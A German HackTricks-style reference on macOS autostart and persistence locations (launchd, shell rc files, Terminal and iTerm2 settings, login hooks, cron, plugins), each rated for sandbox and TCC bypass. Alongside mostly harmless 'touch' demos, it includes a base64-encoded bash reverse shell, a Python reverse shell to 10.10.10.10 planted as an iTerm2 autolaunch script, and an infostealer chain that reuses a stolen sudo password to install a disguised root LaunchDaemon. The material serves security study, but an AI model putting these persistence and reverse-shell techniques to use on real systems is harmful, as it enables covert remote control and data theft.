# macOS-Autostart

{{#include ../banners/hacktricks-training.md}}

Dieser Abschnitt basiert größtenteils auf der Blogserie [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Ziel ist es, **weitere Autostart Locations** (falls möglich) hinzuzufügen, anzugeben, **welche Techniken** heutzutage noch mit der neuesten macOS-Version (13.4) funktionieren, und die erforderlichen **Berechtigungen** zu spezifizieren.

## Sandbox Bypass

> [!TIP]
> Hier findest du Start Locations, die für einen **Sandbox Bypass** nützlich sind. Sie ermöglichen es dir, etwas einfach dadurch auszuführen, dass du es **in eine Datei schreibst** und auf eine sehr **verbreitete** **Aktion**, eine bestimmte **Zeitspanne** oder eine **Aktion, die du normalerweise ausführen kannst**, innerhalb einer Sandbox wartest, ohne Root-Berechtigungen zu benötigen.

### Launchd

- Nützlich für Sandbox Bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**: Neustart
- Root erforderlich
- **`/Library/LaunchDaemons`**
- **Trigger**: Neustart
- Root erforderlich
- **`/System/Library/LaunchAgents`**
- **Trigger**: Neustart
- Root erforderlich
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Neustart
- Root erforderlich
- **`~/Library/LaunchAgents`**
- **Trigger**: Erneute Anmeldung
- **`~/Library/LaunchDemons`**
- **Trigger**: Erneute Anmeldung

> [!TIP]
> Eine interessante Tatsache ist, dass **`launchd`** eine eingebettete Property List im Mach-O-Abschnitt `__Text.__config` besitzt, die weitere bekannte Services enthält, die launchd starten muss. Außerdem können diese Services `RequireSuccess`, `RequireRun` und `RebootOnSuccess` enthalten. Das bedeutet, dass sie ausgeführt werden und erfolgreich abgeschlossen sein müssen.
>
> Ofc kann sie aufgrund von Code Signing nicht geändert werden.

#### Beschreibung & Exploitation

**`launchd`** ist der **erste** **Prozess**, der beim Start vom OX S-Kernel ausgeführt wird, und der letzte, der beim Herunterfahren beendet wird. Er sollte immer die **PID 1** haben. Dieser Prozess wird die Konfigurationen lesen und ausführen, die in den **ASEP**-**plists** unter folgenden Pfaden angegeben sind:

- `/Library/LaunchAgents`: Pro Benutzer installierte Agents des Administrators
- `/Library/LaunchDaemons`: Systemweite Daemons, die vom Administrator installiert wurden
- `/System/Library/LaunchAgents`: Von Apple bereitgestellte Agents pro Benutzer
- `/System/Library/LaunchDaemons`: Von Apple bereitgestellte systemweite Daemons

Wenn sich ein Benutzer anmeldet, werden die unter `/Users/$USER/Library/LaunchAgents` und `/Users/$USER/Library/LaunchDemons` befindlichen plists mit den **Berechtigungen des angemeldeten Benutzers** gestartet.

Der **Hauptunterschied zwischen Agents und Daemons besteht darin, dass Agents geladen werden, wenn sich der Benutzer anmeldet, während Daemons beim Systemstart geladen werden** (da Services wie SSH vor jedem Benutzerzugriff auf das System ausgeführt werden müssen). Außerdem können Agents eine GUI verwenden, während Daemons im Hintergrund ausgeführt werden müssen.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Es gibt Fälle, in denen ein **Agent ausgeführt werden muss, bevor sich der Benutzer einloggt**; diese werden **PreLoginAgents** genannt. Dies ist beispielsweise nützlich, um beim Login unterstützende Technologien bereitzustellen. Sie sind ebenfalls in `/Library/LaunchAgents` zu finden (siehe [**hier**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) ein Beispiel).

> [!TIP]
> Neue Konfigurationsdateien für Daemons oder Agents werden **nach dem nächsten Neustart oder mit** `launchctl load <target.plist>` **geladen.** Es ist **auch möglich, .plist-Dateien ohne diese Erweiterung zu laden** mit `launchctl -F <file>` (diese plist-Dateien werden jedoch nach einem Neustart nicht automatisch geladen).\
> Es ist auch möglich, sie mit `launchctl unload <target.plist>` **zu entladen** (der von ihnen angegebene Prozess wird beendet),
>
> Um **sicherzustellen**, dass **nichts** (wie beispielsweise ein Override) das **Ausführen** eines **Agents** oder **Daemons** **verhindert**, führe Folgendes aus: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Liste alle vom aktuellen Benutzer geladenen Agents und Daemons auf:
```bash
launchctl list
```
#### Beispiel für eine bösartige LaunchDaemon-Kette (Wiederverwendung von Passwörtern)

Ein aktueller macOS-Infostealer verwendete ein **abgefangenes sudo-Passwort** erneut, um einen User-Agent und einen Root-LaunchDaemon abzulegen:

- Die Agent-Schleife in `~/.agent` schreiben und sie ausführbar machen.
- Eine plist in `/tmp/starter` erzeugen, die auf diesen Agent verweist.
- Das gestohlene Passwort mit `sudo -S` erneut verwenden, um die Datei nach `/Library/LaunchDaemons/com.finder.helper.plist` zu kopieren, `root:wheel` festzulegen und sie mit `launchctl load` zu laden.
- Den Agent mit `nohup ~/.agent >/dev/null 2>&1 &` im Hintergrund starten, um die Ausgabe zu lösen.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Wenn ein plist einem Benutzer gehört, wird die **task auch dann als Benutzer und nicht als root ausgeführt**, wenn sie sich in systemweiten daemon-Ordnern befindet. Dies kann einige Privilege-Escalation-Angriffe verhindern.

#### Weitere Informationen zu launchd

**`launchd`** ist der **erste User-Mode-Prozess**, der vom **Kernel** gestartet wird. Der Prozessstart muss **erfolgreich** sein, und der Prozess darf **nicht beendet werden oder abstürzen**. Er ist sogar gegen bestimmte **kill-Signale geschützt**.

Eine der ersten Aufgaben von `launchd` besteht darin, alle **daemons** zu **starten**, zum Beispiel:

- **Timer-daemons**, die anhand der Ausführungszeit gestartet werden:
- atd (`com.apple.atrun.plist`): Verfügt über ein `StartInterval` von 30 Minuten
- crond (`com.apple.systemstats.daily.plist`): Verfügt über ein `StartCalendarInterval`, das den Start um 00:15 auslöst
- **Network-daemons**, zum Beispiel:
- `org.cups.cups-lpd`: Lauscht über TCP (`SockType: stream`) mit `SockServiceName: printer`
- SockServiceName muss entweder ein Port oder ein Service aus `/etc/services` sein
- `com.apple.xscertd.plist`: Lauscht auf TCP-Port 1640
- **Path-daemons**, die ausgeführt werden, wenn sich ein bestimmter Pfad ändert:
- `com.apple.postfix.master`: Überprüft den Pfad `/etc/postfix/aliases`
- **IOKit-Notifications-daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach-Port:**
- `com.apple.xscertd-helper.plist`: Der Eintrag `MachServices` gibt den Namen `com.apple.xscertd.helper` an
- **UserEventAgent:**
- Dies unterscheidet sich vom vorherigen Fall. Es veranlasst launchd, als Reaktion auf ein bestimmtes Ereignis Apps zu starten. In diesem Fall ist die wichtigste beteiligte Binary jedoch nicht `launchd`, sondern `/usr/libexec/UserEventAgent`. Sie lädt Plugins aus dem durch SIP eingeschränkten Ordner `/System/Library/UserEventPlugins/`, wobei jedes Plugin seinen Initializer im Schlüssel `XPCEventModuleInitializer` angibt oder bei älteren Plugins im `CFPluginFactories`-dict unter dem Schlüssel `FB86416D-6164-2070-726F-70735C216EC0` seiner `Info.plist`.

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Du musst jedoch eine App finden, die über einen TCC Bypass verfügt und eine shell ausführt, die diese Dateien lädt

#### Speicherorte

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: Öffnen eines Terminals mit zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: Öffnen eines Terminals mit zsh
- Root erforderlich
- **`~/.zlogout`**
- **Trigger**: Beenden eines Terminals mit zsh
- **`/etc/zlogout`**
- **Trigger**: Beenden eines Terminals mit zsh
- Root erforderlich
- Potenziell weitere in: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: Öffnen eines Terminals mit bash
- `/etc/profile` (funktionierte nicht)
- `~/.profile` (funktionierte nicht)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: Sollte mit xterm ausgelöst werden, ist jedoch **nicht installiert**. Selbst nach der Installation wird dieser Fehler ausgegeben: xterm: `DISPLAY is not set`

#### Beschreibung & Exploitation

Beim Initiieren einer shell-Umgebung wie `zsh` oder `bash` werden **bestimmte startup files ausgeführt**. macOS verwendet derzeit `/bin/zsh` als Standard-shell. Diese shell wird automatisch aufgerufen, wenn die Terminal-Anwendung gestartet wird oder wenn über SSH auf ein Gerät zugegriffen wird. Obwohl `bash` und `sh` ebenfalls in macOS vorhanden sind, müssen sie explizit aufgerufen werden, um sie zu verwenden.

Die man page von zsh, die mit **`man zsh`** gelesen werden kann, enthält eine ausführliche Beschreibung der startup files.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Wieder geöffnete Anwendungen

> [!CAUTION]
> Das Konfigurieren der angegebenen Exploitation sowie das Ab- und Anmelden oder sogar ein Neustart haben bei mir nicht funktioniert, um die Anwendung auszuführen. (Die Anwendung wurde nicht ausgeführt; möglicherweise muss sie laufen, wenn diese Aktionen durchgeführt werden.)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Nützlich zum Umgehen der sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Trigger**: Anwendungen nach einem Neustart erneut öffnen

#### Beschreibung & Exploitation

Alle erneut zu öffnenden Anwendungen befinden sich in der plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Damit die erneut zu öffnenden Anwendungen deine eigene Anwendung starten, musst du lediglich **deine Anwendung zur Liste hinzufügen**.

Die UUID kann durch Auflisten dieses Verzeichnisses oder mit `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` gefunden werden.

Um die Anwendungen zu überprüfen, die erneut geöffnet werden, kannst du Folgendes ausführen:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Um **eine Anwendung zu dieser Liste hinzuzufügen**, kannst du Folgendes verwenden:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal-Einstellungen

- Nützlich zum Umgehen der sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal verwenden, um FDA-Berechtigungen des Benutzers zu erhalten

#### Speicherort

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Trigger**: Terminal öffnen

#### Beschreibung & Exploitation

In **`~/Library/Preferences`** werden die Einstellungen des Benutzers für die Anwendungen gespeichert. Einige dieser Einstellungen können eine Konfiguration enthalten, um **andere Anwendungen/Skripte auszuführen**.

Beispielsweise kann das Terminal beim Startup einen Befehl ausführen:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Diese Konfiguration wird in der Datei **`~/Library/Preferences/com.apple.Terminal.plist`** wie folgt widergespiegelt:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Wenn die plist der Terminal-Einstellungen im System überschrieben werden könnte, kann die Funktion **`open`** verwendet werden, um **das Terminal zu öffnen, woraufhin dieser Befehl ausgeführt wird**.

Du kannst dies über die CLI hinzufügen mit:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal-Skripte / Andere Dateierweiterungen

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal verwenden, um FDA-Berechtigungen des Benutzers zu erhalten

#### Speicherort

- **Überall**
- **Auslöser**: Terminal öffnen

#### Beschreibung & Exploitation

Wenn du ein [**`.terminal`**-Skript](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) erstellst und öffnest, wird die **Terminal-Anwendung** automatisch aufgerufen, um die darin angegebenen Befehle auszuführen. Wenn die Terminal-App über besondere Berechtigungen verfügt (z. B. TCC), wird dein Befehl mit diesen besonderen Berechtigungen ausgeführt.

Probiere es aus mit:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Du könntest auch die Erweiterungen **`.command`** und **`.tool`** mit regulärem Shell-Script-Inhalt verwenden; sie werden ebenfalls von Terminal geöffnet.

> [!CAUTION]
> Wenn Terminal über **Full Disk Access** verfügt, kann es diese Aktion abschließen (beachte, dass der ausgeführte Befehl in einem Terminalfenster sichtbar sein wird).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Du könntest zusätzlichen TCC-Zugriff erhalten

#### Speicherort

- **`/Library/Audio/Plug-Ins/HAL`**
- Root erforderlich
- **Auslöser**: coreaudiod oder den Computer neu starten
- **`/Library/Audio/Plug-ins/Components`**
- Root erforderlich
- **Auslöser**: coreaudiod oder den Computer neu starten
- **`~/Library/Audio/Plug-ins/Components`**
- **Auslöser**: coreaudiod oder den Computer neu starten
- **`/System/Library/Components`**
- Root erforderlich
- **Auslöser**: coreaudiod oder den Computer neu starten

#### Beschreibung

Laut den vorherigen Writeups ist es möglich, **einige Audio Plugins zu kompilieren** und laden zu lassen.

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Du könntest zusätzlichen TCC-Zugriff erhalten

#### Speicherort

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Beschreibung & Exploitation

QuickLook Plugins können ausgeführt werden, wenn du **die Vorschau einer Datei auslöst** (die Leertaste drückst, während die Datei im Finder ausgewählt ist) und ein **Plugin zur Unterstützung dieses Dateityps** installiert ist.

Es ist möglich, ein eigenes QuickLook Plugin zu kompilieren, es an einem der zuvor genannten Speicherorte abzulegen, damit es geladen wird, und anschließend zu einer unterstützten Datei zu navigieren und die Leertaste zu drücken, um es auszulösen.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Bei mir hat dies weder mit dem Benutzer-LoginHook noch mit dem Root-LogoutHook funktioniert.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- Du musst in der Lage sein, etwas wie `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` auszuführen.
- Befindet sich in `~/Library/Preferences/com.apple.loginwindow.plist`

Sie sind veraltet, können aber verwendet werden, um Befehle auszuführen, wenn sich ein Benutzer anmeldet.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Diese Einstellung wird in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` gespeichert.
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Zum Löschen:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Der Eintrag für den root user wird unter **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** gespeichert.

## Conditional Sandbox Bypass

> [!TIP]
> Hier findest du Startorte, die für **sandbox bypass** nützlich sind und es dir ermöglichen, etwas einfach durch **Schreiben in eine Datei** auszuführen, wobei **nicht besonders häufige Bedingungen** wie bestimmte **installierte Programme, „ungewöhnliche“ Benutzeraktionen** oder Umgebungen vorausgesetzt werden.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Nützlich für sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- Du musst jedoch in der Lage sein, das Binary `crontab` auszuführen
- Oder root sein
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Für direkten Schreibzugriff ist root erforderlich. Kein root erforderlich, wenn du `crontab <file>` ausführen kannst
- **Trigger**: Hängt vom Cron-Job ab

#### Description & Exploitation

Liste die Cron-Jobs des **aktuellen Benutzers** mit:
```bash
crontab -l
```
Du kannst auch alle cron jobs der Benutzer in **`/usr/lib/cron/tabs/`** und **`/var/at/tabs/`** sehen (benötigt root).

In MacOS finden sich mehrere Ordner, in denen Skripte mit **bestimmter Häufigkeit** ausgeführt werden:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Dort finden sich die regulären **cron**-**jobs**, die **at**-**jobs** (nicht sehr häufig verwendet) und die **periodic**-**jobs** (hauptsächlich zum Löschen temporärer Dateien). Die täglichen **periodic**-**jobs** können beispielsweise mit folgendem Befehl ausgeführt werden: `periodic daily`.

Um einen **user cronjob** programmatisch hinzuzufügen, kann Folgendes verwendet werden:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 hatte früher erteilte TCC-Berechtigungen

#### Speicherorte

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Auslöser**: iTerm öffnen
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Auslöser**: iTerm öffnen
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Auslöser**: iTerm öffnen

#### Beschreibung & Exploitation

In **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** gespeicherte Skripte werden ausgeführt. Zum Beispiel:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
oder:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Das Skript **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** wird ebenfalls ausgeführt:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Die iTerm2-Einstellungen unter **`~/Library/Preferences/com.googlecode.iterm2.plist`** können **einen Befehl angeben, der beim Öffnen des iTerm2-Terminals ausgeführt wird**.

Diese Einstellung kann in den iTerm2-Einstellungen konfiguriert werden:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Und der Befehl wird in den Einstellungen widergespiegelt:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Du kannst den auszuführenden Befehl festlegen mit:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Es ist höchst wahrscheinlich, dass es **weitere Möglichkeiten gibt, die iTerm2-Einstellungen zu missbrauchen**, um beliebige Befehle auszuführen.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Nützlich zum Umgehen der sandbox: [✅](https://emojipedia.org/check-mark-button)
- xbar muss jedoch installiert sein
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Es fordert Berechtigungen für Bedienungshilfen an

#### Speicherort

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: Sobald xbar ausgeführt wird

#### Beschreibung

Wenn das beliebte Programm [**xbar**](https://github.com/matryer/xbar) installiert ist, kann ein Shell-Skript in **`~/Library/Application\ Support/xbar/plugins/`** geschrieben werden, das beim Start von xbar ausgeführt wird:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- Hammerspoon muss jedoch installiert sein
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Es fordert Berechtigungen für die Bedienungshilfen an

#### Speicherort

- **`~/.hammerspoon/init.lua`**
- **Auslöser**: Sobald Hammerspoon ausgeführt wird

#### Beschreibung

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) dient als Automatisierungsplattform für **macOS** und verwendet für seine Funktionen die **LUA-Skriptsprache**. Besonders hervorzuheben ist die Unterstützung der Integration vollständiger AppleScript-Codes sowie der Ausführung von Shell-Skripten, wodurch die Skripting-Funktionen erheblich erweitert werden.

Die App sucht nach einer einzelnen Datei, `~/.hammerspoon/init.lua`. Beim Start wird das Skript ausgeführt.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- BetterTouchTool muss jedoch installiert sein
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Es fordert Automation-Shortcuts- und Accessibility-Berechtigungen an

#### Speicherort

- `~/Library/Application Support/BetterTouchTool/*`

Dieses Tool ermöglicht es, Anwendungen oder Skripte anzugeben, die ausgeführt werden sollen, wenn bestimmte Shortcuts gedrückt werden. Ein Angreifer könnte möglicherweise seinen eigenen **Shortcut und die auszuführende Aktion in der Datenbank konfigurieren**, damit beliebiger Code ausgeführt wird (ein Shortcut könnte beispielsweise einfach das Drücken einer Taste auslösen).

### Alfred

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- Alfred muss jedoch installiert sein
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Es fordert Automation-, Accessibility- und sogar Full-Disk-access-Berechtigungen an

#### Speicherort

- `???`

Es ermöglicht das Erstellen von Workflows, die Code ausführen können, wenn bestimmte Bedingungen erfüllt sind. Möglicherweise kann ein Angreifer eine Workflow-Datei erstellen und Alfred dazu bringen, sie zu laden (für die Nutzung von Workflows muss die Premium-Version erworben werden).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- SSH muss jedoch aktiviert und verwendet werden
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH kann auf FDA zugreifen

#### Speicherort

- **`~/.ssh/rc`**
- **Auslöser**: Login via SSH
- **`/etc/ssh/sshrc`**
- Root erforderlich
- **Auslöser**: Login via SSH

> [!CAUTION]
> Um SSH zu aktivieren, ist Full Disk Access erforderlich:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Beschreibung & Exploitation

Standardmäßig werden die Skripte **`/etc/ssh/sshrc`** und **`~/.ssh/rc`** ausgeführt, wenn sich ein Benutzer **via SSH anmeldet**, sofern in `/etc/ssh/sshd_config` nicht `PermitUserRC no` gesetzt ist.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- Es ist jedoch erforderlich, `osascript` mit Argumenten auszuführen
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherorte

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Auslöser:** Login
- Exploit-Payload wird durch den Aufruf von **`osascript`** gespeichert
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Auslöser:** Login
- Root erforderlich

#### Beschreibung

In den Systemeinstellungen -> Benutzer & Gruppen -> **Login Items** findest du **Items, die ausgeführt werden, wenn sich der Benutzer anmeldet**.\
Es ist möglich, sie über die Kommandozeile aufzulisten, hinzuzufügen und zu entfernen:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Diese Elemente werden in der Datei **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** gespeichert.

